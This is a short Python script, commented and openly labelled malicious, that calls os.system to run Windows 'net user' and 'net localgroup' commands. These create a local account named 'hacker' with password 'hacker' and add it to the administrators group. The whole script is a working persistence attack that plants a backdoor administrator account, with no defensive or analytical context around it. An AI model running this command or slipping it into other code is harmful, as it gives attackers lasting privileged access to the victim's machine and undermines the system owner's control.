# Import the os module
import os

# Define a malicious command
# This command will create a user named "hacker" with password "hacker"
# and add it to the administrators group
command = "net user /add hacker hacker && net localgroup administrators hacker /add"

# Execute the command using the os.system() function
# This will run the command with elevated privileges if the user is an administrator or a service
os.system(command)